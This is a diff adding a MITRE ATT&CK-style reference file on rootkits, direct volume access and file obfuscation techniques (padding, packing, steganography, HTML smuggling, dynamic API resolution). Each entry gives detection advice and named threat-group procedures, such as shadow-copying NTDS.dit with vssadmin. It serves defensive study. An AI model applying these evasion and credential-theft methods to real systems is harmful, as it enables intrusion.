@@ -1,0 +1,5404 @@
+### T1006 - Direct Volume Access
+
+Description:
+
+Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique may bypass Windows file access controls as well as file system monitoring tools. Utilities, such as `NinjaCopy`, exist to perform these actions in PowerShell. Adversaries may also use built-in or third-party utilities (such as `vssadmin`, `wbadmin`, and esentutl) to create shadow copies or backups of data from system volumes.
+
+Detection:
+
+Monitor handle opens on drive volumes that are made by processes to determine when they may directly access logical drives. Monitor processes and command-line arguments for actions that could be taken to copy files from the logical drive and evade common file system protections. Since this technique may also be used through PowerShell, additional logging of PowerShell scripts is recommended.
+
+Procedures:
+
+- [S0404] esentutl: esentutl can use the Volume Shadow Copy service to copy locked files such as `ntds.dit`.
+- [G1015] Scattered Spider: Scattered Spider has created volume shadow copies of virtual domain controller disks to extract the `NTDS.dit` file.
+- [G1017] Volt Typhoon: Volt Typhoon has executed the Windows-native `vssadmin` command to create volume shadow copies.
+- [C0051] APT28 Nearest Neighbor Campaign: During APT28 Nearest Neighbor Campaign, APT28 accessed volume shadow copies through executing vssadmin in order to dump the NTDS.dit file.
+
+
+### T1014 - Rootkit
+
+Description:
+
+Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting/hooking and modifying operating system API calls that supply system information. Rootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a hypervisor, Master Boot Record, or System Firmware. Rootkits have been seen for Windows, Linux, and Mac OS X systems.
+
+Detection:
+
+Some rootkit protections may be built into anti-virus or operating system software. There are dedicated rootkit detection tools that look for specific types of rootkit behavior. Monitor for the existence of unrecognized DLLs, devices, services, and changes to the MBR.
+
+Procedures:
+
+- [S0377] Ebury: Ebury acts as a user land rootkit using the SSH service.
+- [G0044] Winnti Group: Winnti Group used a rootkit to modify typical server functionality.
+- [G0096] APT41: APT41 deployed rootkits on Linux systems.
+- [G0106] Rocke: Rocke has modified /etc/ld.so.preload to hook libc functions in order to hide the installed dropper and mining software in process lists.
+- [S0484] Carberp: Carberp has used user mode rootkit techniques to remain hidden on the system.
+- [S0458] Ramsay: Ramsay has included a rootkit to evade defenses.
+- [S0502] Drovorub: Drovorub has used a kernel module rootkit to hide processes, files, executables, and network artifacts from user space view.
+- [S0040] HTRAN: HTRAN can install a rootkit to hide network connections from the host OS.
+- [S0135] HIDEDRV: HIDEDRV is a rootkit that hides certain operating system artifacts.
+- [G0139] TeamTNT: TeamTNT has used rootkits such as the open-source Diamorphine rootkit and their custom bots to hide cryptocurrency mining activities on the machine.
+- [S0468] Skidmap: Skidmap is a kernel-mode rootkit that has the ability to hook system calls to hide specific files and fake network and CPU-related statistics to make the CPU load of the infected machine always appear low.
+- [S0221] Umbreon: Umbreon hides from defenders by hooking libc function calls, hiding artifacts that would reveal its presence, such as the user account it creates to provide access and undermining strace, a tool often used to identify malware.
+- [S0603] Stuxnet: Stuxnet uses a Windows rootkit to mask its binaries and other relevant files.
+- [S1105] COATHANGER: COATHANGER hooks or replaces multiple legitimate processes and other functions on victim devices.
+- [S0047] Hacking Team UEFI Rootkit: Hacking Team UEFI Rootkit is a UEFI BIOS rootkit developed by the company Hacking Team to persist remote access software on some targeted systems.
+- [S0394] HiddenWasp: HiddenWasp uses a rootkit to hook and implement functions on the system.
+- [S0601] Hildegard: Hildegard has modified /etc/ld.so.preload to overwrite readdir() and readdir64().
+- [S1186] Line Dancer: Line Dancer can hook both the crash dump process and the Autehntication, Authorization, and Accounting (AAA) functions on compromised machines to evade forensic analysis and authentication mechanisms.
+- [C0046] ArcaneDoor: ArcaneDoor included hooking the `processHostScanReply()` function on victim Cisco ASA devices.
+- [G0007] APT28: APT28 has used a UEFI (Unified Extensible Firmware Interface) rootkit known as LoJax.
+- [S0009] Hikit: Hikit is a Rootkit that has been used by Axiom.
+- [S0430] Winnti for Linux: Winnti for Linux has used a modified copy of the open-source userland rootkit Azazel, named libxselinux.so, to hide the malware's operations and network activity.
+- [S0027] Zeroaccess: Zeroaccess is a kernel-mode rootkit.
+- [S0397] LoJax: LoJax is a UEFI BIOS rootkit deployed to persist remote access software on some targeted systems.
+- [S0022] Uroburos: Uroburos can use its kernel module to prevent its host components from being listed by the targeted system's OS and to mediate requests between user mode and concealed components.
+- [S0670] WarzoneRAT: WarzoneRAT can include a rootkit to hide processes, files, and startup.
+- [S0572] Caterpillar WebShell: Caterpillar WebShell has a module to use a rootkit on a system.
+- [S0012] PoisonIvy: PoisonIvy starts a rootkit from a malicious file dropped to disk.
+
+
+### T1027.001 - Obfuscated Files or Information: Binary Padding
+
+Description:
+
+Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This can be done without affecting the functionality or behavior of a binary, but can increase the size of the binary beyond what some security tools are capable of handling due to file size limitations. Binary padding effectively changes the checksum of the file and can also be used to avoid hash-based blocklists and static anti-virus signatures. The padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware. Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files. This may also reduce the likelihood of being collected for analysis. Public file scanning services, such as VirusTotal, limits the maximum size of an uploaded file to be analyzed.
+
+Detection:
+
+Depending on the method used to pad files, a file-based signature may be capable of detecting padding using a scanning or on-access based tool. When executed, the resulting process from padded files may also exhibit other behavior characteristics of being used to conduct an intrusion such as system and network information Discovery or Lateral Movement, which could be used as event indicators that point to the source file.
+
+Procedures:
+
+- [S0586] TAINTEDSCRIBE: TAINTEDSCRIBE can execute FileRecvWriteRand to append random bytes to the end of a file received from C2.
+- [S0367] Emotet: Emotet inflates malicious files and malware as an evasion technique.
+- [S0528] Javali: Javali can use large obfuscated libraries to hinder detection and analysis.
+- [S0650] QakBot: QakBot can use large file sizes to evade detection.
+- [S0433] Rifdoor: Rifdoor has added four additional bytes of data upon launching, then saved the changed version as C:\ProgramData\Initech\Initech.exe.
+- [G0065] Leviathan: Leviathan has inserted garbage characters into code, presumably to avoid anti-virus detection.
+- [S1149] CHIMNEYSWEEP: The CHIMNEYSWEEP installer has been padded with null bytes to inflate its size.
+- [S0531] Grandoreiro: Grandoreiro has added BMP images to the resources section of its Portable Executable (PE) file increasing each binary to at least 300MB in size.
+- [G0016] APT29: APT29 used large size files to avoid detection by security solutions with hardcoded size limits.
+- [G0002] Moafee: Moafee has been known to employ binary padding.
+- [S0614] CostaBricks: CostaBricks has added the entire unobfuscated code of the legitimate open source application Blink to its code.
+- [S1185] LightSpy: LightSpy's configuration file is appended to the end of the binary. For example, the last `0x1d0` bytes of one sample is an AES encrypted configuration file with a static key of `3e2717e8b3873b29`.
+- [S0268] Bisonal: Bisonal has appended random binary data to the end of itself to generate a large binary.
+- [G0126] Higaisa: Higaisa performed padding with null bytes before calculating its hash.
+- [S0236] Kwampirs: Before writing to disk, Kwampirs inserts a randomly generated string into the middle of the decrypted payload in an attempt to evade hash-based detections.
+- [S1160] Latrodectus: Latrodectus has been obfuscated with a 129 byte sequence of junk data prepended to the file.
+- [S1070] Black Basta: Black Basta had added data prior to the Portable Executable (PE) header to prevent automatic scanners from identifying the payload.
+- [G0040] Patchwork: Patchwork apparently altered NDiskMonitor samples by adding four bytes of random letters in a likely attempt to change the file hashes.
+- [G0060] BRONZE BUTLER: BRONZE BUTLER downloader code has included "0" characters at the end of the file to inflate the file size in a likely attempt to evade anti-virus detection.
+- [S0082] Emissary: A variant of Emissary appends junk data to the end of its DLL file to create a large file that may exceed the maximum size that anti-virus programs can scan.
+- [G1024] Akira: Akira has used binary padding to obfuscate payloads.
+- [S0244] Comnie: Comnie appends a total of 64MB of garbage data to a file to deter any security products in place that may be scanning files on disk.
+- [S0632] GrimAgent: GrimAgent has the ability to add bytes to change the file hash.
+- [S1086] Snip3: Snip3 can obfuscate strings using junk Chinese characters.
+- [S0477] Goopy: Goopy has had null characters padded in its malicious DLL payload.
+
+### T1027.002 - Obfuscated Files or Information: Software Packing
+
+Description:
+
+Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code. Utilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.
+
+Detection:
+
+Use file scanning to look for known software packers or artifacts of packing techniques. Packing is not a definitive indicator of malicious activity, because legitimate software may use packing techniques to reduce binary size or to protect proprietary code.
+
+Procedures:
+
+- [S0588] GoldMax: GoldMax has been packed for obfuscation.
+- [S0447] Lokibot: Lokibot has used several packing methods for obfuscation.
+- [S0625] Cuba: Cuba has a packed payload when delivered.
+- [S0257] VERMIN: VERMIN is initially packed.
+- [S0020] China Chopper: China Chopper's client component is packed with UPX.
+- [C0017] C0017: During C0017, APT41 used VMProtect to slow the reverse engineering of malicious binaries.
+- [S1130] Raspberry Robin: Raspberry Robin contains multiple payloads that are packed for defense evasion purposes and unpacked on runtime.
+- [S0565] Raindrop: Raindrop used a custom packer for its Cobalt Strike payload, which was compressed using the LZMA algorithm.
+- [S1196] Troll Stealer: Troll Stealer has been delivered as a VMProtect-packed binary.
+- [G0089] The White Company: The White Company has obfuscated their payloads through packing.
+- [S0022] Uroburos: Uroburos uses a custom packer.
+- [S0543] Spark: Spark has been packed with Enigma Protector to obfuscate its contents.
+- [G1018] TA2541: TA2541 has used a .NET packer to obfuscate malicious files.
+- [S0198] NETWIRE: NETWIRE has used .NET packer tools to evade detection.
+- [S0409] Machete: Machete has been packed with NSIS.
+- [S0622] AppleSeed: AppleSeed has used UPX packers for its payload DLL.
+- [S0187] Daserf: A version of Daserf uses the MPRESS packer.
+- [G0096] APT41: APT41 uses packers such as Themida to obfuscate malicious files.
+- [S0281] Dok: Dok is packed with an UPX executable packer.
+- [G0070] Dark Caracal: Dark Caracal has used UPX to pack Bandook.
+- [S0356] KONNI: KONNI has been packed for obfuscation.
+- [S1202] LockBit 3.0: LockBit 3.0 can use code packing to hinder analysis.
+- [C0002] Night Dragon: During Night Dragon, threat actors used software packing in its tools.
+- [C0005] Operation Spalax: For Operation Spalax, the threat actors used a variety of packers, including CyaX, to obfuscate malicious executables.
+- [S0373] Astaroth: Astaroth uses a software packer called Pe123\RPolyCryptor.
+- [G1007] Aoqin Dragon: Aoqin Dragon has used the Themida packer to obfuscate malicious payloads.
+- [S0094] Trojan.Karagany: Trojan.Karagany samples sometimes use common binary packers such as UPX and Aspack on top of a custom Delphi binary packer.
+- [G1019] MoustachedBouncer: MoustachedBouncer has used malware plugins packed with Themida.
+- [S0182] FinFisher: A FinFisher variant uses a custom packer.
+- [G0087] APT39: APT39 has packed tools with UPX, and has repacked a modified version of Mimikatz to thwart anti-virus detection.
+- [S0638] Babuk: Versions of Babuk have been packed.
+- [S1183] StrelaStealer: StrelaStealer variants have used packers to obfuscate payloads and make analysis more difficult.
+- [S0601] Hildegard: Hildegard has packed ELF files into other binaries.
+- [S0554] Egregor: Egregor's payloads are custom-packed, archived and encrypted to prevent analysis.
+- [G0092] TA505: TA505 has used UPX to obscure malicious code.
+- [C0016] Operation Dust Storm: For Operation Dust Storm, the threat actors used UPX to pack some payloads.
+- [G1017] Volt Typhoon: Volt Typhoon has used the Ultimate Packer for Executables (UPX) to obfuscate the FRP client files BrightmetricAgent.exe and SMSvcService.ex) and the port scanning utility ScanLine.
+- [S0266] TrickBot: TrickBot leverages a custom packer to obfuscate its functionality.
+- [S0532] Lucifer: Lucifer has used UPX packed binaries.
+- [G0093] GALLIUM: GALLIUM packed some payloads using different types of packers, both known and custom.
+- [S0695] Donut: Donut can generate packed code modules.
+- [G0139] TeamTNT: TeamTNT has used UPX and Ezuri packer to pack its binaries.
+- [G0082] APT38: APT38 has used several code packing methods such as Themida, Enigma, VMProtect, and Obsidium, to pack their implants.
+- [S0461] SDBbot: SDBbot has used a packed installer file.
+- [S0671] Tomiris: Tomiris has been packed with UPX.
+- [S1210] Sagerunex: Sagerunex has used VMProtect to pack and obscure itself.
+- [S0614] CostaBricks: CostaBricks can implement a custom-built virtual machine mechanism to obfuscate its code.
+- [S1160] Latrodectus: The Latrodectus payload has been packed for obfuscation.
+- [S0611] Clop: Clop has been packed to help avoid detection.
+- [S0512] FatDuke: FatDuke has been regularly repacked by its operators to create large binaries and evade detection.
+- [S1018] Saint Bot: Saint Bot has been packed using a dark market crypter.
+- [S0678] Torisma: Torisma has been packed with Iz4 compression.
+- [S0431] HotCroissant: HotCroissant has used the open source UPX executable packer.
+- [S0520] BLINDINGCAN: BLINDINGCAN has been packed with the UPX packer.
+- [G0106] Rocke: Rocke's miner has created UPX-packed files in the Windows Start Menu Folder.
+- [S0352] OSX_OCEANLOTUS.D: OSX_OCEANLOTUS.D has a variant that is packed with UPX.
+- [G0040] Patchwork: A Patchwork payload was packed with UPX.
+- [S0283] jRAT: jRAT payloads have been packed.
+- [S0251] Zebrocy: Zebrocy's Delphi variant was packed with UPX.
+- [S0053] SeaDuke: SeaDuke has been packed with the UPX packer.
+- [S1105] COATHANGER: The first stage of COATHANGER is delivered as a packed file.
+- [S0398] HyperBro: HyperBro has the ability to pack its payload.
+- [S0085] S-Type: Some S-Type samples have been packed with UPX.
+- [S0513] LiteDuke: LiteDuke has been packed with multiple layers of encryption.
+- [S0132] H1N1: H1N1 uses a custom packing algorithm.
+- [C0025] 2016 Ukraine Electric Power Attack: During the 2016 Ukraine Electric Power Attack, Sandworm Team used UPX to pack a copy of Mimikatz.
+- [S0476] Valak: Valak has used packed DLL payloads.
+- [S0694] DRATzarus: DRATzarus's dropper can be packed with UPX.
+- [G0094] Kimsuky: Kimsuky has packed malware with UPX.
+- [S0444] ShimRat: ShimRat's loader has been packed with the compressed ShimRat core DLL and the legitimate DLL for it to hijack.
+- [G0128] ZIRCONIUM: ZIRCONIUM has used multi-stage packers for exploit code.
+- [S0268] Bisonal: Bisonal has used the MPRESS packer and similar tools for obfuscation.
+- [C0022] Operation Dream Job: During Operation Dream Job, Lazarus Group packed malicious .db files with Themida to evade detection.
+- [S0230] ZeroT: Some ZeroT DLL files have been packed with UPX.
+- [S1030] Squirrelwaffle: Squirrelwaffle has been packed with a custom packer to hide payloads.
+- [S0334] DarkComet: DarkComet has the option to compress its payload using UPX or MPRESS.
+- [S0342] GreyEnergy: GreyEnergy is packed for obfuscation.
+- [S0024] Dyre: Dyre has been delivered with encrypted resources and must be unpacked for execution.
+- [S0530] Melcoz: Melcoz has been packed with VMProtect and Themida.
+- [S0455] Metamorfo: Metamorfo has used VMProtect to pack and protect files.
+- [G0027] Threat Group-3390: Threat Group-3390 has packed malware and tools, including using VMProtect.
+- [S0248] yty: yty packs a plugin with UPX.
+- [S0367] Emotet: Emotet has used custom packers to protect its payloads.
+- [S0264] OopsIE: OopsIE uses the SmartAssembly obfuscator to pack an embedded .Net Framework assembly used for C2.
+- [G1031] Saint Bear: Saint Bear clones .NET assemblies from other .NET binaries as well as cloning code signing certificates from other software to obfuscate the initial loader payload.
+- [S0527] CSPY Downloader: CSPY Downloader has been packed with UPX.
+- [S0663] SysUpdate: SysUpdate has been packed with VMProtect.
+- [S1026] Mongall: Mongall has been packed with Themida.
+- [S0083] Misdat: Misdat was typically packed using UPX.
+- [S1207] XLoader: XLoader uses various packers, including CyaX, to obfuscate malicious executables.
+- [S0628] FYAnti: FYAnti has used ConfuserEx to pack its .NET module.
+- [S0650] QakBot: QakBot can encrypt and pack malicious payloads.
+- [S0483] IcedID: IcedID has packed and encrypted its loader module.
+- [G0022] APT3: APT3 has been known to pack their tools.
+- [S0504] Anchor: Anchor has come with a packed payload.
+- [G0066] Elderwood: Elderwood has packed malware payloads before delivery to victims.
+- [S0534] Bazar: Bazar has a variant with a packed payload.
+- [G0016] APT29: APT29 used UPX to pack files.
+
+### T1027.003 - Obfuscated Files or Information: Steganography
+
+Description:
+
+Adversaries may use steganography techniques in order to prevent the detection of hidden information. Steganographic techniques can be used to hide data in digital media such as images, audio tracks, video clips, or text files. Duqu was an early example of malware that used steganography. It encrypted the gathered information from a victim's system and hid it within an image before exfiltrating the image to a C2 server. By the end of 2017, a threat group used Invoke-PSImage to hide PowerShell commands in an image file (.png) and execute the code on a victim's system. In this particular case the PowerShell code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary.
+
+Detection:
+
+Detection of steganography is difficult unless artifacts are left behind by the obfuscation process that are detectable with a known signature. Look for strings or other signatures left in system artifacts related to decoding steganography.
+
+Procedures:
+
+- [G1006] Earth Lusca: Earth Lusca has used steganography to hide shellcode in a BMP image file.
+- [S0495] RDAT: RDAT can also embed data within a BMP image prior to exfiltration.
+- [S0139] PowerDuke: PowerDuke uses steganography to hide backdoors in PNG files, which are also encrypted using the Tiny Encryption Algorithm (TEA).
+- [C0005] Operation Spalax: For Operation Spalax, the threat actors used packers that read pixel data from images contained in PE files' resource sections and build the next layer of execution from the data.
+- [G0067] APT37: APT37 uses steganography to send images to users that are embedded with shellcode.
+- [S0513] LiteDuke: LiteDuke has used image files to hide its loader component.
+- [S0470] BBK: BBK can extract a malicious Portable Executable (PE) from a photo.
+- [S0511] RegDuke: RegDuke can hide data in images, including use of the Least Significant Bit (LSB).
+- [S0471] build_downer: build_downer can extract malware from a downloaded JPEG.
+- [S0439] Okrum: Okrum's payload is encrypted and embedded within its loader, or within a legitimate PNG file.
+- [S0234] Bandook: Bandook has used .PNG images within a zip file to build the executable.
+- [G0127] TA551: TA551 has hidden encoded data for malware DLLs in a PNG.
+- [S0659] Diavol: Diavol has obfuscated its main code routines within bitmap images as part of its anti-analysis techniques.
+- [G0065] Leviathan: Leviathan has used steganography to hide stolen data inside other files stored on Github.
+- [S0458] Ramsay: Ramsay has PE data embedded within JPEG files contained within Word documents.
+- [S0644] ObliqueRAT: ObliqueRAT can hide its payload in BMP images hosted on compromised websites.
+- [S0483] IcedID: IcedID has embedded binaries within RC4 encrypted .png files.
+- [S1145] Pikabot: Pikabot loads a set of PNG images stored in the malware's resources section (RCDATA), each with an encrypted section containing portions of the core Pikabot core module. These sections are loaded and decrypted using a bitwise XOR operation with a hardcoded 32 bit key.
+- [S0469] ABK: ABK can extract a malicious Portable Executable (PE) from a photo.
+- [S0654] ProLock: ProLock can use .jpg and .bmp files to store its payload.
+- [G0069] MuddyWater: MuddyWater has stored obfuscated JavaScript code in an image file named temp.jpg.
+- [S0231] Invoke-PSImage: Invoke-PSImage can be used to embed a PowerShell script within the pixels of a PNG file.
+- [C0023] Operation Ghost: During Operation Ghost, APT29 used steganography to hide payloads inside valid images.
+- [S0565] Raindrop: Raindrop used steganography to locate the start of its encoded payload within legitimate 7-Zip code.
+- [S0473] Avenger: Avenger can extract backdoor malware from downloaded images.
+- [G0138] Andariel: Andariel has hidden malicious executables within PNG files.
+- [G0081] Tropic Trooper: Tropic Trooper has used JPG files with encrypted payloads to mask their backdoor routines and evade detection.
+- [S0518] PolyglotDuke: PolyglotDuke can use steganography to hide C2 information in images.
+- [G0060] BRONZE BUTLER: BRONZE BUTLER has used steganography in multiple operations to conceal malicious payloads.
+
+### T1027.004 - Obfuscated Files or Information: Compile After Delivery
+
+Description:
+
+Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as ilasm.exe, csc.exe, or GCC/MinGW. Source code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a Phishing. Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework.
+
+Detection:
+
+Monitor the execution file paths and command-line arguments for common compilers, such as csc.exe and GCC/MinGW, and correlate with other suspicious behavior to reduce false positives from normal user and administrator behavior. The compilation of payloads may also generate file creation and/or file write events. Look for non-native binary formats and cross-platform compiler and execution frameworks like Mono and determine if they have a legitimate purpose on the system. Typically these should only be used in specific and limited cases, like for software development.
+
+Procedures:
+
+- [G0047] Gamaredon Group: Gamaredon Group has compiled the source code for a downloader directly on the infected system using the built-in Microsoft.CSharp.CSharpCodeProvider class.
+- [S0633] Sliver: Sliver includes functionality to retrieve source code and compile locally prior to execution in victim environments.
+- [S0661] FoggyWeb: FoggyWeb can compile and execute source code sent to the compromised AD FS server via a specific HTTP POST.
+- [G0106] Rocke: Rocke has compiled malware, delivered to victims as .c files, with the GNU Compiler Collection (GCC).
+- [G0069] MuddyWater: MuddyWater has used the .NET csc.exe tool to compile executables from downloaded C# code.
+- [S0385] njRAT: njRAT has used AutoIt to compile the payload and main script into a single executable after delivery.
+- [S0348] Cardinal RAT: Cardinal RAT and its watchdog component are compiled and executed after being delivered to victims as embedded, uncompiled source code.
+- [S1099] Samurai: Samurai can compile and execute downloaded modules at runtime.
+- [G1041] Sea Turtle: Sea Turtle downloaded source code files from remote addresses then compiled them locally via GCC in victim environments.
+- [S0673] DarkWatchman: DarkWatchman has used the csc.exe tool to compile a C# executable.
+
+### T1027.005 - Obfuscated Files or Information: Indicator Removal from Tools
+
+Description:
+
+Adversaries may remove indicators from tools if they believe their malicious tool was detected, quarantined, or otherwise curtailed. They can modify the tool by removing the indicator and using the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems. A good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may modify the file to explicitly avoid that signature, and then re-use the malware.
+
+Detection:
+
+The first detection of a malicious tool may trigger an anti-virus or other security tool alert. Similar events may also occur at the boundary through network IDS, email scanning appliance, etc. The initial detection should be treated as an indication of a potentially more invasive intrusion. The alerting system should be thoroughly investigated beyond that initial alert for activity that was not detected. Adversaries may continue with an operation, assuming that individual events like an anti-virus detect will not be investigated or that an analyst will not be able to conclusively link that event to other activity occurring on the network.
+
+Procedures:
+
+- [S0237] GravityRAT: The author of GravityRAT submitted samples to VirusTotal for testing, showing that the author modified the code to try to hide the DDE object in a different part of the document.
+- [S0154] Cobalt Strike: Cobalt Strike includes a capability to modify the Beacon payload to eliminate known signatures or unpacking methods.
+- [G0040] Patchwork: Patchwork apparently altered NDiskMonitor samples by adding four bytes of random letters in a likely attempt to change the file hashes.
+- [S0194] PowerSploit: PowerSploit's Find-AVSignature AntivirusBypass module can be used to locate single byte anti-virus signatures.
+- [G0009] Deep Panda: Deep Panda has updated and modified its malware, resulting in different hash values that evade detection.
+- [G0093] GALLIUM: GALLIUM ensured each payload had a unique hash, including by using different types of packers.
+- [S0587] Penquin: Penquin can remove strings from binaries.
+- [C0014] Operation Wocao: During Operation Wocao, threat actors edited variable names within the Impacket suite to avoid automated detection.
+- [S0650] QakBot: QakBot can make small changes to itself in order to change its checksum and hash value.
+- [C0030] Triton Safety Instrumented System Attack: In the Triton Safety Instrumented System Attack, TEMP.Veles modified files based on the open-source project cryptcat in an apparent attempt to decrease anti-virus detection rates.
+- [S0579] Waterbear: Waterbear can scramble functions not to be executed again with random values.
+- [S0187] Daserf: Analysis of Daserf has shown that it regularly undergoes technical improvements to evade anti-virus detection.
+- [S0559] SUNBURST: SUNBURST source code used generic variable names and pre-obfuscated strings, and was likely sanitized of developer comments before being added to SUNSPOT.
+- [S0260] InvisiMole: InvisiMole has undergone regular technical improvements in an attempt to evade detection.
+- [G0049] OilRig: OilRig has tested malware samples to determine AV detection and subsequently modified the samples to ensure AV evasion.
+- [G0010] Turla: Based on comparison of Gazer versions, Turla made an effort to obfuscate strings in the malware that could be used as IoCs, including the mutex name and named pipe.
+- [G0022] APT3: APT3 has been known to remove indicators of compromise from tools.
+
+### T1027.006 - Obfuscated Files or Information: HTML Smuggling
+
+Description:
+
+Adversaries may smuggle data and files past content filters by hiding malicious payloads inside of seemingly benign HTML files. HTML documents can store large binary objects known as JavaScript Blobs (immutable data that represents raw bytes) that can later be constructed into file-like objects. Data may also be stored in Data URLs, which enable embedding media type or MIME files inline of HTML documents. HTML5 also introduced a download attribute that may be used to initiate file downloads. Adversaries may deliver payloads to victims that bypass security controls through HTML Smuggling by abusing JavaScript Blobs and/or HTML5 download attributes. Security controls such as web content filters may not identify smuggled malicious files inside of HTML/JS files, as the content may be based on typically benign MIME types such as text/plain and/or text/html. Malicious files or data can be obfuscated and hidden inside of HTML files through Data URLs and/or JavaScript Blobs and can be deobfuscated when they reach the victim (i.e. Deobfuscate/Decode Files or Information), potentially bypassing content filters. For example, JavaScript Blobs can be abused to dynamically generate malicious files in the victim machine and may be dropped to disk by abusing JavaScript functions such as msSaveBlob.
+
+Detection:
+
+Detection of HTML Smuggling is difficult as HTML5 and JavaScript attributes are used by legitimate services and applications. HTML Smuggling can be performed in many ways via JavaScript, developing rules for the different variants, with a combination of different encoding and/or encryption schemes, may be very challenging. Detecting specific JavaScript and/or HTML5 attribute strings such as Blob, msSaveOrOpenBlob, and/or download may be a good indicator of HTML Smuggling. These strings may also be used by legitimate services therefore it is possible to raise false positives. Consider monitoring files downloaded from the Internet, possibly by HTML Smuggling, for suspicious activities. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities.
+
+Procedures:
+
+- [S0650] QakBot: QakBot has been delivered in ZIP files via HTML smuggling.
+- [G0016] APT29: APT29 has embedded an ISO file within an HTML attachment that contained JavaScript code to initiate malware execution.
+- [S0634] EnvyScout: EnvyScout contains JavaScript code that can extract an encoded blob from its HTML body and write it to disk.
+
+### T1027.007 - Obfuscated Files or Information: Dynamic API Resolution
+
+Description:
+
+Adversaries may obfuscate then dynamically resolve API functions called by their malware in order to conceal malicious functionalities and impair defensive analysis. Malware commonly uses various Native API functions provided by the OS to perform various tasks such as those involving processes, files, and other system artifacts. API functions called by malware may leave static artifacts such as strings in payload files. Defensive analysts may also uncover which functions a binary file may execute via an import address table (IAT) or other structures that help dynamically link calling code to the shared modules that provide functions. To avoid static or other defensive analysis, adversaries may use dynamic API resolution to conceal malware characteristics and functionalities. Similar to Software Packing, dynamic API resolution may change file signatures and obfuscate malicious API function calls until they are resolved and invoked during runtime. Various methods may be used to obfuscate malware calls to API functions. For example, hashes of function names are commonly stored in malware in lieu of literal strings. Malware can use these hashes (or other identifiers) to manually reproduce the linking and loading process using functions such as `GetProcAddress()` and `LoadLibrary()`. These hashes/identifiers can also be further obfuscated using encryption or other string manipulation tricks (requiring various forms of Deobfuscate/Decode Files or Information during execution).
+
+Procedures:
+
+- [S1160] Latrodectus: Latrodectus can resolve Windows APIs dynamically by hash.
+- [S0534] Bazar: Bazar can hash then resolve API calls at runtime.
+- [S1053] AvosLocker: AvosLocker has used obfuscated API calls that are retrieved by their checksums.
+- [S1148] Raccoon Stealer: Raccoon Stealer dynamically links key WinApi functions during execution.
+- [G0032] Lazarus Group: Lazarus Group has used a custom hashing method to resolve APIs used in shellcode.
+- [S0147] Pteranodon: Pteranodon can use a dynamic Windows hashing algorithm to map API components.
+- [S1149] CHIMNEYSWEEP: CHIMNEYSWEEP can use `LoadLibrary` and `GetProcAddress` to resolve Windows API function strings at run time.
+- [S1063] Brute Ratel C4: Brute Ratel C4 can call and dynamically resolve hashed APIs.
+- [S1099] Samurai: Samurai can encrypt API name strings with an XOR-based algorithm.
+
+### T1027.008 - Obfuscated Files or Information: Stripped Payloads
+
+Description:
+
+Adversaries may attempt to make a payload difficult to analyze by removing symbols, strings, and other human readable information. Scripts and executables may contain variables names and other strings that help developers document code functionality. Symbols are often created by an operating system’s `linker` when executable payloads are compiled. Reverse engineers use these symbols and strings to analyze code and to identify functionality in payloads. Adversaries may use stripped payloads in order to make malware analysis more difficult. For example, compilers and other tools may provide features to remove or obfuscate strings and symbols. Adversaries have also used stripped payload formats, such as run-only AppleScripts, a compiled and stripped version of AppleScript, to evade detection and analysis. The lack of human-readable information may directly hinder detection and analysis of payloads.
+
+Procedures:
+
+- [S1048] macOS.OSAMiner: macOS.OSAMiner has used run-only Applescripts, a compiled and stripped version of AppleScript, to remove human readable indicators to evade detection.
+- [S1153] Cuckoo Stealer: Cuckoo Stealer is a stripped binary payload.
+
+### T1027.009 - Obfuscated Files or Information: Embedded Payloads
+
+Description:
+
+Adversaries may embed payloads within other files to conceal malicious content from defenses. Otherwise seemingly benign files (such as scripts and executables) may be abused to carry and obfuscate malicious payloads and content. In some cases, embedded payloads may also enable adversaries to Subvert Trust Controls by not impacting execution controls such as digital signatures and notarization tickets. Adversaries may embed payloads in various file formats to hide payloads. This is similar to Steganography, though does not involve weaving malicious content into specific bytes and patterns related to legitimate digital media formats. For example, adversaries have been observed embedding payloads within or as an overlay of an otherwise benign binary. Adversaries have also been observed nesting payloads (such as executables and run-only scripts) inside a file of the same format. Embedded content may also be used as Process Injection payloads used to infect benign system processes. These embedded then injected payloads may be used as part of the modules of malware designed to provide specific features such as encrypting C2 communications in support of an orchestrator module. For example, an embedded module may be injected into default browsers, allowing adversaries to then communicate via the network.
+
+Procedures:
+
+- [S1137] Moneybird: Moneybird contains a configuration blob embedded in the malware itself.
+- [S1052] DEADEYE: The DEADEYE.EMBED variant of DEADEYE has the ability to embed payloads inside of a compiled binary.
+- [G0032] Lazarus Group: Lazarus Group has distributed malicious payloads embedded in PNG files.
+- [S1081] BADHATCH: BADHATCH has an embedded second stage DLL payload within the first stage of the malware.
+- [S1149] CHIMNEYSWEEP: CHIMNEYSWEEP can extract RC4 encrypted embedded payloads for privilege escalation.
+- [S1134] DEADWOOD: DEADWOOD contains an embedded, AES-encrypted payload labeled METADATA that provides configuration information for follow-on execution.
+- [S0367] Emotet: Emotet has dropped an embedded executable at `%Temp%\setup.exe`. Additionally, Emotet may embed entire code into other files.
